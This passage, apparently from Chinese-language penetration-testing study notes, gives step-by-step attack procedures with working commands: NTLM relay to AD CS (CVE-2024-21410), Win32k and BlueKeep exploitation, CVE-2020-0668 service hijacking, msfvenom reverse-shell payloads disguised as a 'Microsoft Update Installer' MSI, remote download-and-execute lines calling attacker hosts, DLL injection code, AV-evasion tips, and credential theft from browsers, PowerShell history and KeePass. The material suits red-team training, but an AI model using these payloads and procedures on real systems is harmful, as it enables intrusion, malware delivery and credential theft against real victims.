* 一般情況下，SmartScreen 會跳出提示；
* 如果成功繞過，執行不會有任何阻擋訊息，payload 直接運行。

***

#### 4️⃣ 寄送攻擊

可透過以下管道：

* 📧 釣魚郵件夾帶惡意 MSI
* 🗂 文件中嵌入超連結指向檔案下載
* USB drop / QR Code 誘導下載

***

### ⚡️ Debug & 常見問題

| 問題                | Debug 解法                                            |
| ----------------- | --------------------------------------------------- |
| SmartScreen 還是有攔截 | 檢查輸出檔案屬性；確保 PoC 工具版本更新                              |
| payload 無法執行      | 確保用 `-f exe` 格式，不要用 shellcode；payload 放在可執行檔內       |
| 測試時觸發 Defender    | 使用 msfvenom 產出後，可結合 Veil / Shellter / Obfuscator 處理 |

***

### 小總結 & 下一步建議

| 步驟  | 工具                            | 功能與目的            |
| --- | ----------------------------- | ---------------- |
| 1️⃣ | msfvenom                      | 產生 payload       |
| 2️⃣ | SmartScreenBypassGenerator.py | 打包 payload 為繞過檔案 |
| 3️⃣ | 寄送 / 社交工程                     | 引導目標執行           |
| 4️⃣ | Meterpreter Listener 建立       | 等待反向連線，後續橫向移動    |

***

### ✅ 1️⃣5️⃣ CVE-2024-21410 (Exchange NTLM Relay)

### 🏢 公司化概念

CVE-2024-21410 是一個針對 **Microsoft Exchange 伺服器** 的 NTLM Relay 攻擊漏洞。\
這個漏洞允許攻擊者透過「中繼（relay）」機制將 Exchange 伺服器的 NTLM 認證發送到 Active Directory Certificate Services (AD CS)，進而取得 Kerberos 票據（TGT）或進一步提權成 Domain Admin。

#### 為什麼企業要重視？

* Exchange 通常是開放對外服務（例如 OWA、ECP）。
* 攻擊者可無需帳號，透過 Exchange 的回應來進行 NTLM relay。
* 一旦成功，中繼攻擊可以導致整個 AD 控制權淪陷。
* 攻擊方式近乎「無檔案」攻擊（fileless），難以追蹤。

***

### 🚀 攻擊流程圖（文字版）

```
1️⃣ 攻擊者監控 Exchange NTLM 請求  
       ↓
2️⃣ 利用 Exchange 回應中繼 NTLM 資訊  
       ↓
3️⃣ 將 Relay 導向 AD CS (AD 憑證服務)  
       ↓
4️⃣ AD CS 頒發憑證（TGT）給攻擊者  
       ↓
5️⃣ 使用憑證請求 Kerberos TGT  
       ↓
6️⃣ 使用 TGT 進行橫向移動，提權成 Domain Admin  
```

***

### 👨‍🏫 攻擊步驟範例

#### ✅ 攻擊前提：

* 目標網域內有 **Microsoft Exchange** 且 Exchange Web Services 對外開放。
* AD CS (憑證服務) 已部署並允許自助型憑證註冊。

***

#### 1️⃣ 確認 Exchange 是否可中繼

```bash
nmap -p 443 --script=http-ntlm-info <exchange_ip>
```

* 如果回傳 NTLM 資訊（Domain/Host/Version），代表可以進行 Relay 攻擊。

***

#### 2️⃣ 利用 ntlmrelayx (Impacket 工具) 設置中繼攻擊

```bash
ntlmrelayx.py -t http://<AD_CS_IP>/certsrv/certfnsh.asp -smb2support --adcs
```

* `-t`：設定中繼目標
* `--adcs`：專為 AD CS 認證中繼模式

***

#### 3️⃣ 利用 Exchange NTLM 請求中繼

* 使用 responder / mitm6 建立伺服器誘騙 Exchange 自行嘗試驗證：

```bash
responder -I eth0 -wrf
```

* 同時運行 ntlmrelayx，等待 Exchange 自動進行 NTLM 流量中繼。

***

#### 4️⃣ 如果成功，ntlmrelayx 會回傳：

```bash
[*] Successfully relayed credentials to AD CS
[*] Certificate successfully retrieved and saved as: administrator.pfx
```

***

#### 5️⃣ 轉換 PFX 憑證為 kirbi

```bash
certipy auth -pfx administrator.pfx -dc-ip <dc_ip> -target <domain.local>
```

* Certipy 會取得 TGT，供後續 pass-the-ticket 攻擊使用。

***

#### 6️⃣ 使用 Kerberos TGT 提權

```bash
export KRB5CCNAME=administrator.ccache
impacket-psexec <domain>/administrator@<victim_ip>
```

* 此時已成功取得 Domain Admin 權限。

***

### ⚡️ Debug & 常見問題

| 問題               | 解法                                           |
| ---------------- | -------------------------------------------- |
| NTLM Relay 無回應   | 確認 Exchange 版本及 AD CS 設定，Exchange 必須允許 NTLM  |
| AD CS 無法簽發憑證     | 檢查 AD CS 是否開啟「Web Enrollment」，以及是否允許 AD 憑證註冊 |
| 憑證轉換 kirbi 時出現錯誤 | 確認使用的 certipy 版本及 openssl 是否支援 pfx 格式        |

***

### ✅ 1️⃣6️⃣ CVE-2024-21338 (Win32k.sys 提權)

### 🏢 公司化概念

CVE-2024-21338 是針對 **Windows Win32k.sys** 驅動的本地權限提升漏洞，\
攻擊者若已取得低權限存取，透過利用 Win32k 核心元件 API 呼叫，\
可以在本機提權為 SYSTEM，\
並進一步用於維持後門、橫向移動或注入惡意程式。

#### 為什麼企業要重視？

* 此漏洞影響 **Windows 10、Windows 11、Windows Server 2019/2022**。
* 被列為「APT 在野利用中」，代表攻擊者已經在真實攻擊中使用。
* 攻擊門檻低，且現成 PoC 已出現。
* 本地漏洞可結合其他攻擊（如釣魚、惡意 Office 文件）快速取得 SYSTEM 權限。

***

### 🚀 攻擊流程圖（文字版）

```
1️⃣ 攻擊者取得低權限 shell  
       ↓
2️⃣ 上傳 CVE-2024-21338 exploit (PoC)  
       ↓
3️⃣ 利用漏洞呼叫 win32k.sys 特定 API  
       ↓
4️⃣ 權限提升至 NT AUTHORITY\SYSTEM  
       ↓
5️⃣ 執行任意後門、橫向移動或憑證竊取  
```

***

### 👨‍🏫 攻擊步驟範例

#### 1️⃣ 前期準備

確認目前權限：

```bash
whoami
whoami /priv
```

* 確認為一般使用者或低權限使用者狀態。

***

#### 2️⃣ 上傳已編譯的 CVE-2024-21338 利用程式

假設 exploit 檔名為：`21338exploit.exe`\
使用 PowerShell 傳送檔案：

```powershell
Invoke-WebRequest -Uri http://attacker-server/21338exploit.exe -OutFile C:\Windows\Temp\21338exploit.exe
```

***

#### 3️⃣ 執行漏洞利用

```powershell
cd C:\Windows\Temp
.\21338exploit.exe
```

* 如果成功，會跳出 SYSTEM shell 或新增 SYSTEM 等級反向連線。

***

#### 4️⃣ 確認是否提權成功

```bash
whoami
```

預期輸出結果：

```
nt authority\system
```

***

#### 5️⃣ 利用 SYSTEM 權限橫向移動

```bash
impacket-secretsdump -target-ip <victim_ip> -hashes <NTLM hash> administrator@<target>
```

或者將 SYSTEM 權限反向連回：

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<your_ip> LPORT=443 -f exe > system_payload.exe
```

然後從 SYSTEM 權限執行 `system_payload.exe`。

***

### 🔎 Debug & 常見問題

| 問題                 | 解決方式                                         |
| ------------------ | -------------------------------------------- |
| exploit.exe 執行沒有回應 | 確認 Windows 版本與 PoC 相容性；需要支援 win32k.sys 呼叫漏洞  |
| 執行時出現權限不足          | 使用 `runas /user:Administrator` 或確保為低權限 shell |
| 沒有 SYSTEM 回應或中斷    | 嘗試在較低版本 (Windows 10 21H2) 重新執行               |

***

### ✅ 1️⃣7️⃣ BlueKeep (CVE-2019-0708)

### 🏢 公司化概念

**CVE-2019-0708（BlueKeep）** 是 Windows 遠端桌面服務（RDP）的重大漏洞，\
屬於未授權遠端程式碼執行 (RCE) 類型，\
允許攻擊者在沒有任何帳號憑證下直接利用 RDP 埠 (3389) 執行任意代碼，\
影響 Windows XP、Windows 7、Windows Server 2003/2008。

#### 企業風險說明

* 此漏洞具備「蠕蟲式傳播」特性，類似於當年的 WannaCry 攻擊。
* 若企業內部有未更新系統或暴露 RDP 埠在外網，非常容易被掃描與自動化利用。
* 攻擊成功後，攻擊者可以直接取得 SYSTEM 權限執行任意行動。

***

### 🚀 攻擊流程圖（文字版）

```
1️⃣ 偵測目標是否開放 RDP 服務  
      ↓  
2️⃣ 使用 Nmap + NSE 腳本確認漏洞是否存在  
      ↓  
3️⃣ 利用 Metasploit 模組或 Standalone exploit 進行攻擊  
      ↓  
4️⃣ 成功利用後取得 SYSTEM 權限  
      ↓  
5️⃣ 建立後門、抓取憑證、橫向移動  
```

***

### 👨‍🏫 攻擊步驟範例

#### 1️⃣ 偵測目標 RDP 埠

```bash
nmap -p 3389 -sV <target-ip>
```

如果看到：

```
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

代表 RDP 開啟中。

***

#### 2️⃣ 確認 BlueKeep 漏洞存在

使用 Nmap NSE 腳本：

```bash
nmap -p 3389 --script rdp-vuln-ms12-020 <target-ip>
```

如果目標回應有 "VULNERABLE"，通常 BlueKeep 存在。

***

#### 3️⃣ 使用 Metasploit 利用

開啟 Metasploit：

```bash
msfconsole
```

載入模組：

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <target-ip>
set RPORT 3389
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
exploit
```

⚠ 注意：此漏洞容易導致系統 BSOD，建議實驗環境使用！

***

#### 4️⃣ 確認是否取得 SYSTEM

在 Meterpreter 取得連線後：

```bash
meterpreter > getuid
```

預期輸出：

```
Server username: NT AUTHORITY\SYSTEM
```

***

#### 5️⃣ 後續橫向移動

* 可以進行憑證轉儲 (mimikatz)
* 或使用 `psexec` 模組進行內網橫向移動。

***

### 🛠 工具推薦

| 工具                       | 用途                       |
| ------------------------ | ------------------------ |
| Nmap + NSE               | 掃描並偵測是否存在漏洞              |
| Metasploit BlueKeep 模組   | 自動化漏洞利用                  |
| RDPBlueKeep (Standalone) | Python 或 C 編寫的獨立 exploit |

### ✅ 1️⃣8️⃣ Windows 核心的「任意檔案移動」權限提升漏洞  (CVE-2020-0668)



### 🚀 CVE-2020-0668 攻擊流程圖 (文字版)

```
1️⃣ 確認使用者權限 (whoami /priv)
        ↓
2️⃣ 找尋目標可寫入系統檔案 (例如 Mozilla Maintenance Service)
        ↓
3️⃣ 使用 msfvenom 建立惡意 EXE（反向連接 Meterpreter）
        ↓
4️⃣ 將惡意檔案傳送至目標 (透過 wget / curl)
        ↓
5️⃣ 使用漏洞程式將惡意檔案搬移到系統目錄
        ↓
6️⃣ 使用 icacls 驗證可控權限
        ↓
7️⃣ 用未損壞副本覆蓋系統執行檔
        ↓
8️⃣ 啟動服務，取得 SYSTEM 權限回連
        ↓
9️⃣ 使用 meterpreter shell 完整提權 + dump hash
```

***

### 👨‍🏫 攻擊步驟範例 + 工具指令

#### 🔎 1. 確認目前帳號權限

```bash
whoami /priv
```

**目的**：確認目前帳號是否為低權限，並準備權限提升。

***

#### 🔎 2. 找系統可利用目標

```bash
icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

**結果**：看到 `BUILTIN\Users:(I)(RX)` 表示可以執行，但不可改寫，需要利用漏洞來修改權限。

***

#### ⚒ 3. 製作惡意 EXE

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=你的IP LPORT=8443 -f exe > maintenanceservice.exe
```

**目的**：建立惡意反向 shell EXE。

***

#### 📥 4. 傳送惡意檔案到目標

```bash
python3 -m http.server 8080
# 在目標機器下載
wget http://攻擊機IP:8080/maintenanceservice.exe -O maintenanceservice.exe
wget http://攻擊機IP:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

**說明**：下載兩個副本，一個用來搬移，一個備用。

***

#### 📦 5. 利用 CVE-2020-0668 搬移檔案

```bash
C:\Tools\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

**說明**：透過漏洞程式將惡意 EXE 搬進系統目錄。

***

#### ✅ 6. 驗證權限

```bash
icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

**應該看到**：`WINLPE-WS02\htb-student:(F)` 意味著擁有完整控制權。

***

#### 🔁 7. 覆蓋被破壞的 EXE

```cmd
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

> 注意：只能用 `cmd.exe`，PowerShell 會出錯。

***

#### 🏁 8. 設定 metasploit listener

建立 `handler.rc`：

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 攻擊機IP
set LPORT 8443
exploit
```

然後執行：

```bash
msfconsole -r handler.rc
```

***

#### 🚀 9. 啟動目標服務（觸發漏洞）

```bash
net start MozillaMaintenance
```

> 即便錯誤訊息出現，仍然會觸發反向連接！

***

#### 💻 10. 接收到 Meterpreter 回連

```bash
meterpreter > getuid
meterpreter > sysinfo
meterpreter > hashdump
```

> 成功拿到 NT AUTHORITY\SYSTEM 權限並可開始後續橫向移動！

***

### 📝 小總結：

* CVE-2020-0668 是一個「間接提權」漏洞，需要結合第三方服務或其他載入技術。
* 通常與 **Mozilla Maintenance Service** 搭配使用最容易成功。
* 運用漏洞後要立即用備份副本覆蓋，避免損壞導致系統異常。
* 成功回連後，第一步先 `getuid` 確認 SYSTEM 權限，第二步 `hashdump` 撈帳號密碼哈希。
* 可用於紅隊滲透與 CTF Windows 權限提升題目。

</details>

<details>

<summary>中毒攻擊   生成惡意 MSI 並建立反向連線</summary>



✅ 使用 msfvenom 生成惡意 MSI 並建立反向連線&#x20;

***

## 1️⃣ 攻擊目標概念：

這是一種社交工程攻擊方式，透過生成 MSI 安裝檔案，當目標執行後會自動連回攻擊端，獲取 shell 控制權。

***

## 2️⃣ 生成惡意 MSI 檔案

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.234 LPORT=1234 -f exe > aie.exe
```

| 指令參數                           | 說明                          |
| ------------------------------ | --------------------------- |
| -p windows/shell\_reverse\_tcp | 生成 Windows 反向 shell Payload |
| LHOST=10.10.14.72              | 本地 IP，回連目標                  |
| LPORT=9443                     | 攻擊端監聽的 port                 |
| -f exe                         | 指定輸出格式為 exe 安裝檔             |
| > aie.exe                      | 將結果輸出為 aie.msi 檔案           |

***

## 3️⃣ 設定 Metasploit Handler 監聽

打開 msfconsole：

```
msfconsole
```

配置 listener：

```
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST 10.10.14.72
set LPORT 9443
set ExitOnSession false
exploit -j
```

| 指令                                      | 功能說明                         |
| --------------------------------------- | ---------------------------- |
| use exploit/multi/handler               | 使用通用回連監聽模組                   |
| set payload windows/shell\_reverse\_tcp | 設定與生成 payload 相同的反向 shell 方式 |
| set LHOST 10.10.14.72                   | 設定回連 IP，必須和 payload 參數相同     |
| set LPORT 9443                          | 設定回連 port                    |
| set ExitOnSession false                 | 在接到回連 session 後不要自動退出，繼續監聽   |
| exploit -j                              | 在背景執行                        |

***

## 4️⃣ 傳送 aie.msi 給目標受害者

### 方法 1️⃣：手動拷貝

* 透過 U 盤、郵件或共享資料夾方式傳送至目標主機。

### 方法 2️⃣：建立 HTTP Server 供下載

在 Kali 上：

```
python3 -m http.server 8080
```

Windows 受害者下載命令：

```
powershell -c "Invoke-WebRequest -Uri http://10.10.14.72:8080/aie.msi -OutFile C:\Users\Public\aie.msi"
```

或：

```
certutil -urlcache -split -f http://10.10.14.72:8080/aie.msi C:\Users\Public\aie.msi
```

然後執行：

```
C:\Users\Public\aie.msi
```

***

## 5️⃣ 接收到回連後

Metasploit 顯示：

```
[*] Sending stage (xxxx bytes) to <目標IP>
[*] Command shell session 1 opened (10.10.14.72:9443 -> <目標IP>:xxxx)
```

進入 session：

```
sessions -i 1
```

進行基礎確認：

```
whoami
systeminfo
```

***

## 6️⃣ 若被 Windows Defender 擋住

改用加密殼與 EXE 包裝：

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.72 LPORT=9443 -f exe -e x86/shikata_ga_nai > aie.exe
```

然後用 MSI Wrapper 打包成 MSI：

```
msi_wrapper.exe -o output.msi -e aie.exe -n "Microsoft Update Installer"
```

***

## ✅ 小總結（抄在筆記最底部）：

1. 用 msfvenom 產生惡意 MSI。
2. 開啟 msfconsole 配置 handler 並監聽。
3. 傳遞 MSI 檔案給受害者。
4. 成功執行後接收到 shell，進行滲透後操作。
5. 若被偵測，使用加密方式並用 msi\_wrapper 包裝。

</details>

<details>

<summary>Vulnerable Services (脆弱服務)</summary>

在企業環境中，即便系統本身已經打過補丁並配置良好，**允許使用者自行安裝軟體**或**第三方軟體/服務的脆弱性**，依然是滲透測試中極佳的提權切入點。\
這類脆弱服務通常運行在**SYSTEM 權限**，一旦存在未授權命令注入或錯誤權限設置，\
攻擊者便能在低權限帳戶下透過本地或 RPC 方式，直接升級為 SYSTEM。

> 🚨 實際企業常見高風險場景：

* 授權使用者有本地安裝權限
* 老舊版本備份軟體（如 Druva inSync、Veeam）
* Monitoring Agent（如 SolarWinds、ManageEngine）
* 服務端口未限制（內網開放任意存取）

***

### 🚀 攻擊流程圖（文字版）

```
1️⃣ 枚舉已安裝軟體 (wmic / Get-WmiObject)
      ↓
2️⃣ Google / Exploit-DB 檢索版本是否存在已知漏洞
      ↓
3️⃣ 確認服務執行權限（一般都以 SYSTEM 運行）
      ↓
4️⃣ 確認本地服務監聽端口（netstat）
      ↓
5️⃣ 利用 Exploit PoC 發送特製封包或本地交互
      ↓
6️⃣ 取得 SYSTEM 權限 shell 或創建本地管理員帳戶
```

***

### 👨‍🏫 攻擊範例（Druva inSync 弱點利用）

#### 1️⃣ 枚舉已安裝軟體

```powershell
wmic product get name
```

發現：

```
Druva inSync 6.6.3
```

***

#### 2️⃣ 檢查服務監聽端口

```powershell
netstat -ano | findstr 6064
```

顯示：

```
TCP    127.0.0.1:6064         LISTENING
```

***

#### 3️⃣ 查詢對應進程

```powershell
get-process -Id <PID>
```

結果：

```
ProcessName: inSyncCPHwnet64 (SYSTEM 權限)
```

***

#### 4️⃣ 脆弱服務交互（PoC 利用）

PoC PowerShell 範例：

```powershell
$cmd = "net user pentest123 /add"
# 以下建立 TCP 並將指令傳遞
```

或改成透過 powershell 載入反向 shell：

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<your_ip>:8080/shell.ps1')"
```

***

#### 5️⃣ 啟動 Python Server & Netcat 監聽

```bash
python3 -m http.server 8080
nc -lvnp 9443
```

***

#### 6️⃣ 在目標端執行 PoC

結果返回：

```
PS C:\WINDOWS\system32> whoami
nt authority\system
```

***

### 🛠 工具清單推薦

| 工具名稱                 | 功能                          |
| -------------------- | --------------------------- |
| wmic / Get-WmiObject | 枚舉系統已安裝應用程式                 |
| netstat              | 查詢本地監聽端口                    |
| PowerShell           | PoC 寫入及發送特製 RPC 請求          |
| nc / netcat          | 等待反向 shell 回連               |
| Python http.server   | 臨時檔案分享 / 提供 PowerShell 腳本下載 |

***

### ✅ 常見錯誤與 Debug

| 問題                | 解決方法                                        |
| ----------------- | ------------------------------------------- |
| PowerShell 無法執行腳本 | `Set-ExecutionPolicy Bypass -Scope Process` |
| 沒有收到回連            | 檢查目標機是否可以存取攻擊主機 IP（內網或防火牆問題）                |
| 命令注入失敗或沒有回應       | 確認版本是否正確，或嘗試改為建立本地管理員帳戶命令先做測試               |

</details>

<details>

<summary>DLL Injection</summary>



🏢 公司化概念\
DLL Injection（DLL 注入）是一種將特定惡意或自訂 DLL 檔案插入目標進程內部的技術，讓該 DLL 在目標進程上下文中執行，進而影響其行為或竊取敏感資源。此技術除了合法用途（如 Hot Patching 與 Azure 無重啟更新），也是駭客常用來繞過防毒、防火牆或提升權限的重要手法。若企業端應用未做好路徑防護、白名單與記憶體防護，極易成為攻擊目標。

🚀 攻擊流程圖（超詳細版）

```
1️⃣ 偵測目標進程（透過 Process Explorer / tasklist 找到駐留應用程式）
↓
2️⃣ 確認目標 PID (Process ID)
↓
3️⃣ 製作惡意 DLL（可含 Meterpreter、反向連線、鍵盤側錄、RAT 等功能）
↓
4️⃣ 開啟目標進程權限句柄（OpenProcess，確保有寫入記憶體、創建執行緒權限）
↓
5️⃣ 遠端分配記憶體空間（VirtualAllocEx）
↓
6️⃣ 寫入 DLL 路徑到目標進程記憶體 (WriteProcessMemory)
↓
7️⃣ 取得 kernel32.dll 的 LoadLibraryA 位址 (GetProcAddress)
↓
8️⃣ 透過 CreateRemoteThread 呼叫 LoadLibraryA 執行 DLL 載入
↓
9️⃣ DLL 在目標進程中成功執行，控制權交到攻擊者手中
```

👨‍🏫 攻擊指令範例（專業與細節版）\
1️⃣ **查找目標 PID**：

```powershell
tasklist | findstr <目標名稱>
```

2️⃣ **產生 DLL 載荷**（以 msfvenom 爲例）：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<本機IP> LPORT=4444 -f dll -o evil.dll
```

3️⃣ **C 範例程式碼（基本 DLL 注入）：**

```c
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
LPVOID addr = VirtualAllocEx(hProcess, NULL, strlen(dll_path), MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, addr, dll_path, strlen(dll_path), NULL);
LPTHREAD_START_ROUTINE loadlib = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, loadlib, addr, 0, NULL);
```

4️⃣ **Metasploit 反射型注入模組（適用高階目標）：**

```bash
use exploit/windows/local/reflective_dll_injection
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <本機IP>
set LPORT 4444
exploit
```

5️⃣ **偵測 DLL 劫持點（使用 ProcMon）：**

* 篩選 Operation 為 `CreateFile` 且結果為 `NAME NOT FOUND`。
* 找出應用程式嘗試讀取但找不到的 DLL 名稱。
* 自製 DLL 放置於相同路徑，即可劫持。

🛠 工具與建議

| 工具               | 用途                                     |
| ---------------- | -------------------------------------- |
| Process Explorer | 檢查目標進程與已載入模組清單                         |
| ProcMon          | 即時監控檔案載入與 DLL 搜尋失敗紀錄                   |
| PE Explorer      | 分析 DLL PE 檔頭與函式匯入表                     |
| CFF Explorer     | 修改 DLL Metadata，製作 Proxy DLL 使用        |
| Metasploit       | 內建多種 DLL 注入與 Exploit 模組支援              |
| PowerShell       | 可快速進行測試性 PoC DLL 注入或 PowerShell 下載執行攻擊 |
| msfvenom         | 建立各式 Windows 反向連線、Meterpreter DLL 載荷   |

✅ 小結 & 下一步建議

* 如果目標系統具備 EDR / AV 防護，優先考慮使用 Manual Mapping 或 Reflective Injection，避免 LoadLibrary 呼叫被偵測。
* 高階滲透階段時，盡量利用 DLL 劫持方式滲透到企業 IT 管理工具或常駐服務。
* 注入成功後可進一步設定：計劃任務、WMI 監聽、註冊表持久化或使用 msf post 模組執行 lateral movement。



</details>

<details>

<summary>Credential Hunting（憑證狩獵）</summary>



### 一、攻擊目標概念：

憑證狩獵是在系統中（本地或域環境）尋找硬編碼、暫存、或未妥善保護的密碼、帳號憑證。\
透過這些憑證，我們可以：

* 提升本地權限（Local Privilege Escalation）
* 獲取橫向移動入口（Lateral Movement）
* 域內權限提升（Domain Privilege Escalation）
* 持久化植入或後門部署

***

### 二、攻擊流程樹狀圖（文字版）：

```
憑證狩獵（Credential Hunting）
├─ 應用配置檔案（App Config Files）
│   ├─ 搜尋敏感字 (findstr / grep)
│   └─ 觀察 web.config、database.config、appsettings.json
├─ PowerShell 歷史記錄檔
│   ├─ 讀取 ConsoleHost_history.txt
│   └─ 橫向抓取所有使用者歷史紀錄
├─ 瀏覽器字典檔（如 Chrome Custom Dictionary）
├─ Unattend.xml、自動化安裝文件
│   ├─ 搜索常見路徑（C:\Windows\Panther、C:\Windows\System32\Sysprep）
│   └─ Base64 解碼或明文密碼讀取
├─ PowerShell Clixml 憑證文件解密
└─ 登錄檔 & 設定檔敏感信息
```

***

### 三、具體操作範例與背後原理：

***

#### 1️⃣ 尋找配置文件中的密碼

* **為什麼**：\
  很多應用為方便管理，在 .config、.ini、.xml、或 .json 文件中硬編碼密碼。
* **命令範例（Windows）**：

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

* **範例結果**：

```
C:\inetpub\wwwroot\web.config: <add key="dbPassword" value="P@ssw0rd123!" />
```

* **如果沒有結果**： 改用遞迴搜尋：

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

* **Debug**：\
  如果報權限不足，先提升至 SYSTEM 權限或用 SeBackupPrivilege 讀檔案。

***

#### 2️⃣ 瀏覽器字典文件

* **為什麼**：\
  有些使用者會將密碼誤加入 Chrome 字典檔。
* **範例路徑**：

```powershell
gc 'C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt'
```

* **結果範例**：

```
Password1234!
```

* **Debug**：\
  用 admin 權限存取多個使用者路徑。

***

#### 3️⃣ Unattend.xml 文件

* **為什麼**：\
  Windows 安裝腳本常存放明文 AutoLogon 憑證。
* **搜尋範例**：

```powershell
Get-ChildItem -Path C:\ -Recurse -Include unattend.xml,unattend.xml.bak -ErrorAction SilentlyContinue
```

* **結果範例**：

```xml
<Value>local_4dmin_p@ss</Value>
```

* **Debug**： 如果遭遇「存取被拒」，使用 SYSTEM 權限重新搜索。

***

#### 4️⃣ PowerShell 歷史檔

* **為什麼**：\
  系統管理員常不小心在 PowerShell 執行過含密碼的指令。
* **命令範例**：

```powershell
gc (Get-PSReadLineOption).HistorySavePath
```

* **橫向獵取多用戶**：

```powershell
foreach($user in ((ls C:\users).fullname)){
    cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}
```

* **結果範例**：

```
wevtutil qe Application /u:WEB02\administrator /p:5erv3rAdmin!
```

* **Debug**：\
  沒有找到結果時，取得本機管理員權限，再嘗試存取其他帳號目錄。

***

#### 5️⃣ PowerShell Clixml 憑證解密

* **為什麼**：\
  系統管理員會將密碼用 `Export-Clixml` 儲存，但只有同用戶同機器可解密。
* **範例程式**：

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

* **結果範例**：

```
bob / Str0ng3ncryptedP@ss!
```

* **Debug**：\
  如無法解密，確認目前是否同一個使用者上下文，或找其他帳號 session 注入取得同上下文執行。

</details>

<details>

<summary>進階本地與網路共用磁碟憑證狩獵</summary>

1️⃣ 企業中常見情況：

用戶將密碼、金鑰、副檔名敏感檔案（如 .kdbx, .vmdk, .ppk, .rdp, password.txt 等）隨意保存在本地或共用磁碟。

多數企業設置 FILE01\users 共用資料夾，每個使用者的資料夾皆為「可被全域讀取」。

這些檔案一旦被找到，就能快速進行橫向移動或權限提升。

🌳 流程樹狀圖（文字版）：

```
本地與網路共用磁碟憑證狩獵
├─ 本地磁碟搜尋
│   ├─ 使用 findstr 搜尋敏感字串
│   ├─ 使用 PowerShell select-string 遞迴搜尋
│   ├─ Sticky Notes plum.sqlite 解析
│   └─ 檢查無人值守安裝檔 unattend.xml
│
├─ 網路共用磁碟檢索
│   ├─ net use 檢查現有掛載磁碟
│   ├─ 使用 snaffler 自動化獵取敏感檔
│   └─ 手動尋找特定副檔名（.kdbx、.ppk、.rdp、.cred）
│
└─ 利用取得憑證行動
    ├─ RDP、WinRM 測試登入
    ├─ 利用 PsExec 執行橫向移動
    └─ 將帳號關係圖送入 BloodHound 分析路徑
```

🛠 手動搜尋指令與範例：

1️⃣ 手動搜尋檔案內容（找「password」字串）

```
findstr /SI /M "password" *.txt *.ini *.cfg *.config *.xml
select-string -Path C:\Users\*\Documents\*.txt -Pattern password
```

2️⃣ 搜尋特定副檔名

```
dir /S /B *pass*.txt *cred* *.vnc *.config
where /R C:\ *.config
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.kdbx, *.ppk -ErrorAction Ignore
```

3️⃣ Sticky Notes 資料庫分析

* 路徑：C:\Users\\\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes\_8wekyb3d8bbwe\LocalState\plum.sqlite
* 可用 DB Browser for SQLite 或 PowerShell PSSQLite 模組查詢。

4️⃣ 網路共用磁碟獵取

* 檢查掛載磁碟：

```
net use
```

* 使用 Snaffler 自動化搜尋：

```
Snaffler.exe --output-dir "C:\loot" --threads 10
```

5️⃣ 常見「其他」敏感檔案清單（需檢查）

* %SYSTEMDRIVE%\pagefile.sys
* %WINDIR%\debug\NetSetup.log
* %WINDIR%\system32\config\security.sav
* %USERPROFILE%\ntuser.dat
* C:\ProgramData\Configs\\\*

💡 如果發現權限不足

* 嘗試取得系統管理員或 SYSTEM 權限
* 使用 PsExec 提升權限：

```
psexec -i -s cmd.exe
```

* 檢查目錄權限使用：

```
AccessChk.exe -d <target_folder
```

</details>

<details>

<summary>進一步的憑證盜竊（Further Credential Theft）</summary>



🌳 流程樹狀圖：

```
進一步憑證狩獵
├─ Cmdkey 儲存憑證
├─ 瀏覽器憑證（SharpChrome）
├─ 密碼管理器（KeePass 哈希破解）
├─ 電子郵件 (MailSniper 搜索)
├─ LaZagne 多軟體憑證提取
├─ SessionGopher 搜索會話憑證
├─ Windows AutoLogon 憑證
├─ PuTTY 註冊表憑證
└─ WiFi 儲存密碼提取
```

進一步的憑證盜竊（Further Credential Theft）

1️⃣ Cmdkey 保存的憑證

* **概念**：cmdkey 指令可列出、建立、刪除儲存的憑證，通常用於 RDP 或終端服務。
* **操作範例**：

```
cmdkey /list
```

* **應用**：找到後可透過 RDP 或 `runas` 重用該憑證。
* **重用指令範例**：

```
runas /savecred /user:domain\\user "powershell.exe"
```

2️⃣ 瀏覽器儲存憑證提取（Chrome 範例）

* **工具**：SharpChrome
* **使用範例**：

```
SharpChrome.exe logins /unprotect
```

* **說明**：可取得 cookie、儲存的登入資訊。要注意會產生日誌事件（4983、4688、16385）。

3️⃣ 密碼管理器（KeePass）哈希提取與破解

* **步驟**：
  * 找到 `.kdbx` 檔案。
  * 使用 keepass2john 提取哈希：

```
python2.7 keepass2john.py file.kdbx > hash.txt
```

* 使用 Hashcat 破解：

```
hashcat -m 13400 hash.txt rockyou.txt
